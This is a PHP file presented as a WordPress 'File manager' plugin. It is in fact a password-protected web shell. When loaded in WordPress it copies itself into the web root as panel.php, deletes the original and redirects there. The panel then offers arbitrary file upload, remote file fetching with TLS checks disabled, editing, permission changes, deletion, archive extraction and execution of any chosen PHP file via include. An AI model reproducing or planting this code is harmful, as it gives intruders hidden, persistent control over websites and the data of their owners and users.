<?php
/*
Plugin Name: File manager v1.98
Plugin URI: http://xn--vnhvn-q81b.vn
Version: 1.98
Description: File Manager
Author: VinhNoName
Author URI: http://xn--vnhvn-q81b.vn
*/
date_default_timezone_set('Asia/Ho_Chi_Minh');
if (isset($_SERVER['DOCUMENT_ROOT']) && !empty($_SERVER['DOCUMENT_ROOT']))
	$root = $_SERVER['DOCUMENT_ROOT'];
else
	if (isset($_SERVER['SCRIPT_FILENAME']) && !empty($_SERVER['SCRIPT_FILENAME']))
		$root = $_SERVER['SCRIPT_FILENAME'];
	else
		$root = realpath(dirname(__FILE__));
//list($root)=explode($_SERVER['PHP_SELF'], $root);
$posi = strrpos($root, $_SERVER['PHP_SELF']);
if ($posi === false)
	$root = $root;
else
	$root = substr($root, 0, $posi);
unset($posi);
if (!function_exists('file_put_contents')) {
	function file_put_contents($f, $c)
	{
		$fp = fopen($f, 'w');
		fwrite($fp, $c);
		fclose($fp);
	}
}
if (!function_exists('file_get_contents')) {
	function file_get_contents($f)
	{
		$c = '';
		$kb = 5;
		$f = fopen($f, 'r');
		while (!feof($f)) {
			$c .= fread($f, 1024 * $kb);
		}
		fclose($file);
		return $c;
	}
}
if (!function_exists('scandir')) {
	function scandir($d)
	{
		$file = array();
		if ($d = opendir($d)) {
			while (($f = readdir($d)) !== false) {
				$file[] = $f;
			}
			closedir($d);
		}
		//$file=array_reverse($file);
		return $file;
	}
}
if (function_exists('wp_insert_post') || defined('WP_HOME') || function_exists('is_wp_error') ||
	function_exists('add_action')) {
	$panel = $root . '/panel.php';
	if (is_file($panel))
		unlink($panel);
	file_put_contents($panel, file_get_contents(__FILE__));
	unlink(__FILE__);
	header('Location: /panel.php');
	echo '<script>location.href="/panel.php";</script>';
	exit;
}
?>
<?php
/*
* File Manager v22.01.1998
* Overwrite: True
* For: Mobile phone
* Style: No style
* Author: VinhNoName
* Email: vinhmoder@gmail.com
* Facebook: facebook.com/yeumodgame
* Twitter: twitter.com/vinhnoname
* Copyright: (C) 2014 VinhNoName
* All Rights Reserved.
*/
if (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()) {
	$process = array(
		&$_GET,
		&$_POST,
		&$_COOKIE,
		&$_REQUEST);
	while (list($key, $val) = each($process)) {
		foreach ($val as $k => $v) {
			if (is_array($v)) {
				$process[$key][stripslashes($k)] = $v;
				$process[] = &$process[$key][stripslashes($k)];
			} else {
				$process[$key][stripslashes($k)] = stripslashes($v);
			}
		}
	}
	unset($process);
}

header('Content-Type: '); //Fix header
@ini_set('max_execution_time', 3600);
if (!isset($_SERVER['PHP_SELF']))
	$_SERVER['PHP_SELF'] = '';

$is_safe_mode = strtolower(@ini_get('safe_mode'));
if ($is_safe_mode != '1' && $is_safe_mode != 'on' && function_exists('set_time_limit'))
	set_time_limit(3600);
//mo
if (empty($_REQUEST['mo'])) {
	$path_info = !empty($_SERVER['PATH_INFO']) ? $_SERVER['PATH_INFO'] : (!empty($_SERVER['ORIG_PATH_INFO']) ?
		$_SERVER['ORIG_PATH_INFO'] : '');
	if (substr($path_info, 0, 1) == '/')
		$path_info = substr($path_info, 1, strlen($path_info));
	$mo = $path_info;
} else {
	$mo = trim(rawurldecode($_REQUEST['mo']));
}
if (!empty($mo)) {
	if (substr($mo, -1) != '/')
		$mo .= '/';
	$path = $mo;
} else {
	$mo = '';
	$path = './';
}
//mo
//Password
$password = md5('VinhNoName:'.md5('vinhja.xt'));
$GLOBALS['password'] = $password;
$_http_host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (isset($_SERVER['SERVER_NAME']) ?
	$_SERVER['SERVER_NAME'] : 'localhost');
$_script_url = 'http' . ((isset($_ENV['HTTPS']) && $_ENV['HTTPS'] == 'on') || $_SERVER['SERVER_PORT'] ==
	443 ? 's' : '') . '://' . $_http_host . ($_SERVER['SERVER_PORT'] != 80 && $_SERVER['SERVER_PORT'] !=
	443 ? ':' . $_SERVER['SERVER_PORT'] : '') . $_SERVER['PHP_SELF'];
$_script_base = substr($_script_url, 0, strrpos($_script_url, '/') + 1);
//$lang[26]
$lang['vi'] = array(
	'Mật khẩu: ',
	'Xóa',
	'Chmod',
	'Sửa đổi',
	'Giải nén',
	'Đổi tên',
	'Chọn tất cả',
	'Thành công!',
	'Thất bại!',
	'ĐĂNG XUẤT',
	'Trang chủ',
	'Đến',
	'Chỉnh Sửa: ',
	'Tải lên',
	'Lưu',
	'Nén',
	'Sao chép',
	'Đăng Nhập',
	'Tải lên tập tin từ máy: ',
	'Nhập link tập tin: ',
	'File Manager',
	'Nhập tên mới: (Ví dụ: files/tenfile.php)',
	'Lưu bản backup',
	'Di chuyển',
	'English',
	'Sử dụng fsockopen()',
	'Giải nén sau khi tải lên','Thư mục không tồn tại','Chạy file','Bao gồm response headers','Sắp xếp','Xoá cache');
$lang['en'] = array(
	'Password: ',
	'Delete',
	'Chmod',
	'Edit',
	'Extract',
	'Rename',
	'Select all',
	'Successfully!',
	'Failed!',
	'LOGOUT',
	'Home',
	'Go',
	'Editing: ',
	'Upload',
	'Save',
	'Zip',
	'Copy',
	'Login',
	'Browser: ',
	'Import: ',
	'File Manager',
	'New name: (Eg: files/name.php)',
	'Save backup',
	'Move',
	'Tiếng Việt',
	'Using fsockopen()',
	'Extract after file was uploaded','Directory Not Found','Run','Include Response headers','Sort','Refresh cache');
//Set language
if (!isset($_COOKIE['lang']))
	if (preg_match('/v(i|n)/i', $_SERVER['HTTP_ACCEPT_LANGUAGE']))
		$_COOKIE['lang'] = 'vi';
	else
		$_COOKIE['lang'] = 'en';
if (isset($_GET['lang'])) {
	if ($_COOKIE['lang'] == 'vi') {
		setcookie('lang', 'en', time() + 3600 * 24 * 365, '/');
	} else {
		setcookie('lang', 'vi', time() + 3600 * 24 * 365, '/');
	}
	header('Location: ' . $_script_url.'?mo='.urlencode($mo));
	exit;
}
if ($_COOKIE['lang'] == 'en')
	$lang = $lang['en'];
else
	$lang = $lang['vi'];
//sort_file
if (!isset($_COOKIE['sort_file'])){
	$_COOKIE['sort_file']=0;
}
if (isset($_GET['sort_file'])) {
	if ($_COOKIE['sort_file'] == 0) {
		setcookie('sort_file', 1, time() + 3600 * 24 * 365, '/');
	} else {
		setcookie('sort_file', 0, time() + 3600 * 24 * 365, '/');
	}
	header('Location: ' . $_script_url.'?mo='.urlencode($mo));
	exit;
}


$login = false;
if (isset($_POST['pass']) && md5('VinhNoName:'.md5($_POST['pass'])) == $password) {
	$login = true;
	setcookie('php_id', $password, time() + 3600 * 24 * 365, '/');
}
if (isset($_COOKIE['php_id']) && $_COOKIE['php_id'] == $password)
	$login = true;
if (isset($_REQUEST['thoat'])) {
	setcookie('php_id', '', time() - 1998, '/');
	$login = false;
}
//$login=true;
if (!$login) {
	header('Content-Type: text/html; charset=utf-8');
	echo '<title>' , $lang[20] , '</title><style>input{padding: 5px 8px} html,input,textarea{font-size: 20px}</style>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<script type="text/javascript">
function dn(){
var pass=document.getElementById("pass").value;
if(pass!=""){
var vdn=document.getElementById("vdn");
vdn.submit();
}}
</script>
<div align="center"><a href="?lang">' , $lang[24] , '</a><br/>
<form method="post" id="vdn" action="' , $_script_url , '">' , $lang[0] ,
		'<br /><input type="password" id="pass" name="pass" size="9" onfocus="this.onmouseout=dn;" onblur="dn();" /><br /><input type="submit" value="' ,
		$lang[17] , '" /></form></div>';
	exit;
}
if (isset($_REQUEST['tai'])) {
	error_reporting(0);//Not show
	$tai = rawurldecode($_REQUEST['tai']);
	if (is_file($tai) && file_exists($tai)) {
		if(ini_get('zlib.output_compression')) {
    	ini_set('zlib.output_compression', 'Off');
		}
		header('Content-Type: application/octet-stream');
		header('Content-Length: ' . filesize($tai));
		header('Content-Disposition: attachment; filename="'.addslashes(basename($tai)).'"');
		$fp = fopen($tai, 'rb');
		while (!feof($fp)) {
			echo fread($fp, 8192);
			flush();
		}
		fclose($fp);
	}
	exit();
}
while (@ob_end_clean());
ob_start();
//ob_end_flush();

//error_reporting(0);//Not show
error_reporting(E_ALL); //Show all
ini_set('display_errors', 1);

$file = isset($_REQUEST['chon']) ? $_REQUEST['chon'] : array();
$link = isset($_REQUEST['link']) ? trim($_REQUEST['link']) : '';
$fileu = isset($_FILES['file']['name']) ? $_FILES['file']['name'] : false;
if(!function_exists('resetCache')){
function resetCache($file = null)
    {
        $success = false;
        if ($file === null) {
            $success = opcache_reset();
        } else if (function_exists('opcache_invalidate')) {
            $success = opcache_invalidate(urldecode($file), true);
        }
        return $success;
    }
}
if(!function_exists('vdel')){
function vdel($file)
{
	if (file_exists($file) && trim($file, '/') != trim($GLOBALS['root'], '/')) {
		if (is_file($file)) {
			chmod($file, 0644);
			unlink($file);
		} else {
			chmod($file, 0755);
			$file .= '/';
			$dir = scandir($file);
			$arsize = sizeof($dir);
			for ($i = 0; $i < $arsize; $i++) {
				$v = $dir[$i];
				if ($v != '.' && $v != '..')
					vdel($file . $v);
			}
			rmdir($file);
		}
	}
}}
if(!function_exists('saochep')){
function saochep($file, $new = '.')
{
	if(realpath($file)==realpath($new)) return false;
	if($new=='') $new='.';
	if (file_exists($file)) {
		if (is_file($file)) {
			if (file_exists($new))
				vdel($new);
			chmod($file, 0644);
			copy($file, $new);
		} else {
			chmod($file, 0755);
			if (!is_dir($new)) {
				mkdir($new, 0755);
			}
			$new .= '/';
			$file .= '/';
			$dir = scandir($file);
			$arsize = sizeof($dir);
			for ($i = 0; $i < $arsize; $i++) {
				$v = $dir[$i];
				if ($v != '.' && $v != '..') {
					saochep($file . $v, $new . $v);
				}
			}
		}
	}
return true;
}
}
if(!function_exists('taotm')){
function taotm($file, $mo = '')
{
	$thm = explode('/', $file);
	if (isset($thm[1])) {
		$tm = $mo . $thm[0];
		if (!is_dir($tm) && $tm != '')
			mkdir($tm, 0755);
		$vi = count($thm) - 1;
		for ($i = 1; $i < $vi; $i++) {
			$tm .= '/' . $thm[$i];
			if (!is_dir($tm))
				mkdir($tm, 0755);
		}
	}
}}
if(!function_exists('strtoutf8')){
function strtoutf8($str){
		if (!function_exists('mb_list_encodings')) {
			$list_encodings = $this->mb_list_encodings_m();
		} else {
			$list_encodings = mb_list_encodings();
		}
		$str = mb_convert_encoding((string)$str, 'ISO-8859-1', $list_encodings);
	return $str;

}}
if(!function_exists('mb_list_encodings_m')){
	function mb_list_encodings_m()
	{
		$list = array('pass',
			'auto',
			'wchar',
			'byte2be',
			'byte2le',
			'byte4be',
			'byte4le',
			'BASE64',
			'UUENCODE',
			'HTML-ENTITIES',
			'Quoted-Printable',
			'7bit',
			'8bit',
			'UCS-4',
			'UCS-4BE',
			'UCS-4LE',
			'UCS-2',
			'UCS-2BE',
			'UCS-2LE',
			'UTF-32',
			'UTF-32BE',
			'UTF-32LE',
			'UTF-16',
			'UTF-16BE',
			'UTF-16LE',
			'UTF-8',
			'UTF-7',
			'UTF7-IMAP',
			'ASCII',
			'EUC-JP',
			'SJIS',
			'eucJP-win',
			'SJIS-win',
			'CP932',
			'CP51932',
			'JIS',
			'ISO-2022-JP',
			'ISO-2022-JP-MS',
			'Windows-1252',
			'Windows-1254',
			'ISO-8859-1',
			'ISO-8859-2',
			'ISO-8859-3',
			'ISO-8859-4',
			'ISO-8859-5',
			'ISO-8859-6',
			'ISO-8859-7',
			'ISO-8859-8',
			'ISO-8859-9',
			'ISO-8859-10',
			'ISO-8859-13',
			'ISO-8859-14',
			'ISO-8859-15',
			'ISO-8859-16',
			'EUC-CN',
			'CP936',
			'HZ',
			'EUC-TW',
			'BIG-5',
			'EUC-KR',
			'UHC',
			'ISO-2022-KR',
			'Windows-1251',
			'CP866',
			'KOI8-R',
			'KOI8-U',
			'ArmSCII-8',
			'CP850',
			'JIS-ms',
			'CP50220',
			'CP50220raw',
			'CP50221',
			'CP50222');
		return $list;
	}
	}
if(!function_exists('sendnocache')){
function sendnocache()
{
	header('Cache-Control: no-store, no-cache, must-revalidate');
	header('Cache-Control: post-check=0, pre-check=0', false);
	header('Pragma: no-cache');
}
}
sendnocache();
header('Content-Type: text/html; charset=utf-8');
echo '<title>' , $lang[20] , '</title><style>input{padding: 5px 8px} html, input, textarea{font-size: 22px}</style>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<script type="text/javascript">
function checkall(){
for(i=0;i < document.finfo.elements.length; i++ ){
if(document.finfo.elements[i].checked == true){
document.finfo.elements[i].checked=false;
}else{
document.finfo.elements[i].checked=true;
}}}
function go(){
var vform=document.getElementById("vgo");
vform.submit();
}
</script>
<div align="left"><a href="?lang">' , $lang[24] , '</a><br/>
<a href="' , $_script_url , '?thoat">' , $lang[9] , '</a><br/>
<a href="' , $_script_url , '?df">Disable function</a><br/>
<a href="' , $_script_url , '?mo=' , $root , '">' , $lang[10] , '</a><br/>
<form method="post" enctype="multipart/form-data">
' , $lang[18] , '<br /><input type="file" name="file" /><br />
' , $lang[19] , '<br /><textarea name="link"></textarea><br />
' , $lang[21] , '<br /><input type="text" size="10" name="ten" /><br />
<input type="checkbox" name="incheader" value="1" />  ' , $lang[29] , '<br />
<input type="checkbox" name="fsockopen" value="1" />  ' , $lang[25] , '<br />
<input type="checkbox" name="unz" value="1" />  ' , $lang[26] , '<br />
<input type="submit" value="' , $lang[13] , '" />
</form><br/>
<form id="vgo" action="' , $_script_url ,
	'" method="get"><input id="mo" name="mo" size="10" value="' , htmlspecialchars($mo) ,
	'" type="text" onblur="go();" onfocus="this.select();this.onmouseout=go;" /> <input type="submit" value="' , $lang[11] ,
	'" /></form><br/>
';
if (isset($_REQUEST['df'])) {
	$disable = @ini_get('disable_functions');
	if (empty($disable))
		$disable = 'None';
	echo '<br />Disabled functions:<br />' , $disable;
	exit(0);
}
if ($fileu) {
	$ten = trim($_REQUEST['ten']);
	if (!empty($ten)) {
		if (substr($ten, -1) == '/')
			$ten .= $fileu;
		$fileu = $ten;
	}
	taotm($fileu, $mo);
	if (isset($_REQUEST['unz']))
		$fileu = $fileu . rand(10, 99);
	$filename = $fileu;
	$fileu = $path . $fileu;
	if (is_file($fileu))
		vdel($fileu);
	if (move_uploaded_file($_FILES['file']['tmp_name'], $fileu)) {
		echo '<div style="color: green">' , $lang[7] , '</div>';
		if (isset($_REQUEST['unz'])) {
			$_REQUEST['unzip'] = 1;
			$_REQUEST['xoa'] = 1;
			$path_2 = substr($fileu, 0, strrpos($fileu, '/') + 1);
			$file = array($filename);
		}
	} else {
		echo '<div style="color: red">' , $lang[8] , '</div>';
	}
}
if (!empty($link) && $link != 'https://' && $link != 'http://' && $link !=
	'ftp://') {
	if (isset($_REQUEST['fsockopen'])) {
		$redirect=0;
		function download($url = 'http://', $file, $ref='')
		{
			global $redirect;
			$_response_headers = array();
			$matches = parse_url($url);
			$host = $matches['host'];
			$link = (isset($matches['path']) ? $matches['path'] : '/') . (isset($matches['query']) ?
				'?' . $matches['query'] : '') . (isset($matches['fragment']) ? '#' . $matches['fragment'] :
				'');
			$port = !empty($matches['port']) ? $matches['port'] : 80;
			$fsock = fsockopen((($matches['scheme'] == 'https' && extension_loaded('openssl')) ?
				'ssl://' : 'tcp://') . $host, $port, $errno, $errval, 300);
			$fp = fopen($file, 'a');
			if (!$fsock) {
				echo '<div style="color: red">' , $errval , ' (' , $errno , ')</div>';
			} else {
				if(empty($ref)) $ref=$url;
				$header = 'GET ' . $link . ' HTTP/1.0
Host: ' . $host . '
User-Agent: ' . $_SERVER['HTTP_USER_AGENT'] . '
Accept: ' . $_SERVER['HTTP_ACCEPT'] . '
Accept-Language: ' . $_SERVER['HTTP_ACCEPT_LANGUAGE'] . '
Cookie: php_id=' . $GLOBALS['password'] . '
Referer: ' . $ref . '

';
				fwrite($fsock, $header);
				$line = fgets($fsock, 8192);
				while (strspn($line, "\r\n") !== strlen($line)) {
					@list($name, $value) = explode(':', $line, 2);
					$name = trim($name);
					$_response_headers[strtolower($name)][] = trim($value);
					$line = fgets($fsock, 8192);
				}
			if(isset($_POST['incheader'])){
				echo '<pre>Request headers: to ',$url,'
';
				echo $header;
				echo '

Response headers:
';
				var_dump($_response_headers);
				echo '</pre>';
			}
				
				if(isset($_response_headers['location']) && !empty($_response_headers['location']) && $redirect < 5){
				fclose($fp);
				fclose($fsock);
				$redirect++;
				return download($_response_headers['location'][0], $file, $url);
				}
				
				while ($data = fread($fsock, 8192)) {
					fwrite($fp, $data);
				}
				fclose($fp);
				fclose($fsock);
			}
			return $_response_headers;
		}
	} else {
		function download($link = 'http://', $file)
		{
			$fp = fopen($file, 'w');
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $link);
			if(isset($_POST['incheader'])){
			curl_setopt($ch, CURLOPT_HEADER, 1);
			curl_setopt($ch, CURLINFO_HEADER_OUT, 1);
			}else{
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLINFO_HEADER_OUT, 0);
			}
			curl_setopt($ch, CURLOPT_REFERER, $link);
			curl_setopt($ch, CURLOPT_AUTOREFERER, 1);
			curl_setopt($ch, CURLOPT_FRESH_CONNECT, 1);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch, CURLOPT_MAXREDIRS, 20);
			curl_setopt($ch, CURLOPT_COOKIE, 'php_id=' . $GLOBALS['password']);
			curl_setopt($ch, CURLOPT_FILE, $fp);
			$data=curl_exec($ch);
			if(isset($_POST['incheader'])){
				echo '<pre>Request headers: to ',$link,'
';
				echo curl_getinfo($ch, CURLINFO_HEADER_OUT);
				echo '

Response headers:
See in your file.
</pre>';
			}
			fclose($fp);
			unset($ch);
			unset($fp);
			if(filesize($file)==0) file_put_contents($file, $data);
		}
	}
	function badlink($link)
	{
		$htt = strtolower(substr($link, 0, 6));
		if ($htt == 'https:' || $htt == 'http:/' || $htt == 'ftp://')
			return false;
		return true;
	}
	$links = str_replace("\r", '', $link);
	$links = explode("\n", $links);
	foreach ($links as $link) {
		if (badlink($link))
			$link = 'http://' . $link;
		$ten = substr($link, -1);
		if ($ten == '/') {
			$file = 'import-' . rand(10, 99) . '.vnn';
		} else {
			$file = '';
			list($file) = explode('?', $link);
			$bad = array(
				'<',
				'>',
				'&',
				':',
				'=',
				';',
				'?',
				'%20',
				'%');
			$file = str_replace($bad, '', urldecode($file));
			unset($bad);
			$file = basename($file);
		}
		$ten = trim($_REQUEST['ten']);
		if ($ten) {
			if (substr($ten, -1) == '/')
				$ten .= $file;
			$file = $ten;
		}
		taotm($file, $mo);
		if (isset($_REQUEST['unz']))
			$file = $file . rand(10, 99);
		$filename = $file;
		$file = $path . $filename;
		if (is_file($file))
			vdel($file);
		if ($link != 'http://')
			download($link, $file);
		if (isset($_REQUEST['unz'])) {
			$_REQUEST['unzip'] = 1;
			$_REQUEST['xoa'] = 1;
			$path_2 = substr($file, 0, strrpos($file, '/') + 1);
			$file = array($filename);
		}
		echo '<div style="color: green">' , $lang[7] , '</div>';
	}
}
if(isset($_REQUEST['resetCache'])){
	foreach($file as $f){
		resetCache($mo.$f);
		echo '<div style="color: green">' , $lang[7] , '</div>';
	}
}
if (isset($_REQUEST['zip']) && extension_loaded('zip')) {
	function allfile($path)
	{
		$listf = array();
		if (is_file($path)) {
			$listf[] = $path;
		} else {
			$path .= '/';
			$dir = scandir($path);
			$arsize = sizeof($dir);
			for ($i = 0; $i < $arsize; $i++) {
				$v = $dir[$i];
				if ($v != '.' && $v != '..') {
					$arr = array();
					$arr = allfile($path . $v);
					$listf = array_merge($arr, $listf);
				}
			}
		}
		return $listf;
	}
	$zf = $mo . 'Files_'.date('Y-m-d_his').'.zip';
	vdel($zf);
	file_put_contents($zf, null);
	$zip = new ZipArchive();
	$zip->open($zf);
	$zip->addFromString('VinhNoName.txt', 'Zipped on '.date('H:i:s d/m/Y').' by VinhNoName.');
	$pos=strlen($mo);
	foreach ($file as $f) {
		$listf = allfile($mo . $f);
		foreach ($listf as $vf) {
			$f=substr($vf,$pos);
			$zip->addFile($vf,$f);
		}
	}
	$zip->close();
	unset($zip);
	echo '<div style="color: green">' , $lang[7] , '</div>';
}
if (isset($_REQUEST['unzip']) && extension_loaded('zip')) {
	if (!isset($path_2))
		$path_2 = $path;
	foreach ($file as $f) {
		$zip = new ZipArchive();
		if ($zip->open($mo . $f) === true) {
			$zip->extractTo($path_2);
			$zip->close();
			unset($zip);
			echo '<div style="color: green">' , $lang[7] , '</div>';
		} else
			if (function_exists('rar_open')) {
				$rar_file = rar_open($mo . $f);
				$list = rar_list($rar_file);
				foreach ($list as $file) {
					$entry = rar_entry_get($rar_file, $file->getName());
					$entry->extract($path_2);
				}
				rar_close($rar_file);
				echo '<div style="color: green">' , $lang[7] , '</div>';
			} else {
				echo '<div style="color: red">' , $lang[8] , '</div>';
			}
	}
}
if (isset($_REQUEST['bak']))
	copy($_REQUEST['tenfile'], $_REQUEST['tenfile'] . '.bak');
if (isset($_REQUEST['editednd'])) {
	chmod($_REQUEST['tenfile'], 0644);
	unlink($_REQUEST['tenfile']);
	file_put_contents($_REQUEST['tenfile'], $_REQUEST['editednd']);
	unset($_REQUEST['editednd']);
	unset($_REQUEST['editednd']);
	echo '<div style="color: green">' , $lang[7] , '</div>';
}
if (isset($_REQUEST['editv'])) {
	$fileu = '';
	$fileu=implode("\n",$_REQUEST['editv']);
	$fileu = trim($fileu);
	chmod($_REQUEST['tenfile'], 0644);
	unlink($_REQUEST['tenfile']);
	file_put_contents($_REQUEST['tenfile'], $fileu);
	unset($fileu);
	unset($_REQUEST['editv']);
	echo '<div style="color: green">' , $lang[7] , '</div>';
}
if (isset($_REQUEST['edit'])) {
	if (filesize($mo . $file[0]) > 10000000000) {
		$v = isset($_REQUEST['ln']) ? $_REQUEST['ln'] : null;
		if (($v == null) || ($v < 1) || ($v > 50))
			$v = 7;
		$fl = explode("\n",file_get_contents($mo . $file[0]));
		$cnt = count($fl);
		$allp = ceil($cnt / $v);
		$ar = null;
		echo '<div align="center">' , $lang[12] , htmlspecialchars($file[0]) ,
			'</div><form method="post"><input type="hidden" name="tenfile" value="' ,
			htmlspecialchars($mo . $file[0]) , '" />';
		for ($j = 1; $j < $allp + 1; $j++) {
			$begin = $j * $v - $v;
			if ($begin > $cnt)
				$begin = 0;
			$end = $begin + $v;
			if ($end > $cnt)
				$end = $cnt;
			$vl = $end - $begin;
			echo '<div>
<textarea name="editv[]" rows="' , ($v + 1) , '" cols="90">';
			for ($i = 0; $i < $vl; $i++) {
				echo htmlspecialchars($fl[$begin + $i], ENT_QUOTES);
			}
			echo '</textarea></div>';
		}
		unset($ar);
		unset($fl);
		echo '<div>
<textarea name="editv[]" rows="' , ($v + 1) , '" cols="90"></textarea>
</div>
<input type="submit" value="' , $lang[14] , '" /> 
 <input type="submit" name="bak" value="' , $lang[22] , '" />
</form>';
	} else {
		echo '<div align="center">' , $lang[12] , htmlspecialchars($file[0]) ,
			'</div><form method="post"><input type="hidden" name="tenfile" value="' ,
			htmlspecialchars($mo . $file[0]) ,
			'" /><textarea name="editednd" cols="90" rows="8">';
		echo htmlspecialchars(file_get_contents($mo . $file[0]));
		echo '</textarea><br/><input type="submit" value="' , $lang[14] , '" /> 
 <input type="submit" name="bak" value="' , $lang[22] , '" />
</form>';
	}
	exit();
}
if (isset($_REQUEST['doiten'])) {
	echo '<form method="post"><input type="hidden" name="tencu" value="' ,
		htmlspecialchars($mo . $file[0]) . '" />' , $lang[21] ,
		'<input type="text" name="tenmoi" size="10" value="' , htmlspecialchars($mo . $file[0]) ,
		'" />
<br /><input type="submit" value="' , $lang[5] , '" name="rename" />  
  <input type="submit" value="' , $lang[23] , '" name="move" />  
  <input type="submit" value="' , $lang[16] , '" name="copy" /></form>';
	exit();
}
if (isset($_REQUEST['copy'])) {
	taotm($_REQUEST['tenmoi']);
	saochep($_REQUEST['tencu'], $_REQUEST['tenmoi']);
	echo '<div style="color: green">' , $lang[7] , '</div>';
}
if (isset($_REQUEST['move'])) {
	taotm($_REQUEST['tenmoi']);
	$fileu=saochep($_REQUEST['tencu'], $_REQUEST['tenmoi']);
	if($fileu)
	vdel($_REQUEST['tencu']);
	echo '<div style="color: green">' , $lang[7] , '</div>';
}
if (isset($_REQUEST['rename'])) {
	taotm($_REQUEST['tenmoi']);
	if (file_exists($_REQUEST['tencu'])) {
		if (rename($_REQUEST['tencu'], $_REQUEST['tenmoi'])) {
			echo '<div style="color: green">' , $lang[7] , '</div>';
		} else {
			echo '<div style="color: red">' , $lang[8] , '</div>';
		}
	}
}
if (isset($_REQUEST['chmod'])) {
	$p = fileperms($mo . $file[0]);
	$p = base_convert($p, 10, 8);
	$p = substr($p, strlen($p) - 3);
	echo '<form method="post"><input type="hidden" name="tenfile" value="' ,
		htmlspecialchars($mo . $file[0]) , '" />' , $lang[2] ,
		': <input type="text" name="cnew" size="3" value="' , $p ,
		'" maxlength="3" /><br />
<input type="submit" value="' , $lang[2] , '" name="chm" /></form>';
	exit();
}
if (isset($_REQUEST['chm'])) {
	if (file_exists($_REQUEST['tenfile'])) {
		$nmod = octdec('0' . $_REQUEST['cnew']);
		if (chmod($_REQUEST['tenfile'], $nmod)) {
			echo '<div style="color: green">' , $lang[7] , '</div>';
		} else {
			echo '<div style="color: red">' , $lang[8] , '</div>';
		}
	}
}
if (isset($_REQUEST['xoa'])) {
	foreach ($file as $f) {
	   if(!empty($f)) vdel($mo . $f);
	}
	echo '<div style="color: green">' , $lang[7] , '</div>';
}
//Listing files
echo '<form method="post" name="finfo" id="finfo">
<span>   <a href="javascript:;" onClick="checkall();">' , $lang[6] , '</a></span>&nbsp;&nbsp;|&nbsp;&nbsp;<span><a href="?sort_file=1&mo=',urlencode($mo),'">',$lang[30],'</a></span><br/>';
if (is_dir($path)) {
if($_COOKIE['sort_file']){
	$dir=scandir($path);
	if(empty($dir)) exit($lang[27]);
	sort($dir);
	foreach($dir as $vi){
	if($vi!='.' && $vi!='..'){
	$v=$mo.$vi;
	$vi=htmlspecialchars($vi);
	if(is_file($v)){
	$filesize=filesize($v);
	//$write=is_writable($v)?1:0;
	$v=rawurlencode($v);
	echo '<div>
	<span style="color: red">&bull;</span> <input type="checkbox" name="chon[]" value="'.$vi.'" />  <a href="'.$_script_url.'?tai='.$v.'">'.$vi.'</a> (<span style="color:red">',$filesize,' bytes</span>)
	</div>';
	}else{
	$v=rawurlencode($v);
	echo '<div>
	<span style="color: red">&bull;</span> <input type="checkbox" name="chon[]" value="'.$vi.'">  <a href="'.$_script_url.'?mo='.$v.'"><b>'.$vi.'</b></a>
	</div>';
	}}}
}else{
	$dir = opendir($path);
	if($dir){
		while (($vi = readdir($dir)) !== false) {
		if ($vi != '.' && $vi != '..') {
			$v = $mo . $vi;
			$vi = htmlspecialchars($vi);
			if (is_file($v)) {
				$filesize=filesize($v);
				//$write=is_writable($v)?1:0;
				$v = rawurlencode($v);
				echo '<div>
<span style="color: red">&bull;</span> <input type="checkbox" name="chon[]" value="' ,
					$vi , '" />  <a href="' , $_script_url , '?tai=' , $v , '">' , $vi , '</a> (<span style="color:red">',$filesize,' bytes</span>)
</div>';
			} else {
				$v = rawurlencode($v);
				echo '<div>
<span style="color: red">&bull;</span> <input type="checkbox" name="chon[]" value="' ,
					$vi , '">  <a href="' , $_script_url , '?mo=' , $v , '"><b>' , $vi , '</b></a>
</div>';
			}
		}
	}
	closedir($dir);
	}else{
	exit($lang[27]);
	}
}//sort

}else{
	exit($lang[27]);
}

echo '<br /><br /><input type="submit" value="' , $lang[31] , '" name="resetCache" /> 
<input type="submit" value="' , $lang[28] , '" name="run" /> 
<input type="submit" value="' , $lang[15] , '" name="zip" /> 
<input type="submit" value="' , $lang[5] , '" name="doiten" /> 
<input type="submit" value="' , $lang[4] , '" name="unzip" /> 
<input type="submit" value="' , $lang[3] , '" name="edit" /> 
<input type="submit" value="' , $lang[2] , '" name="chmod" /> 
<input type="submit" value="' , $lang[1] , '" name="xoa" />
</form>';
unset($dir);
echo '</div>';

if(isset($_REQUEST['run'])){
	foreach ($file as $f) {
		if(is_dir($path))
		chdir($path);
		resetCache($f);
		include $f;
	}
}
ob_end_flush();
exit(); //Delete ads from host

?>
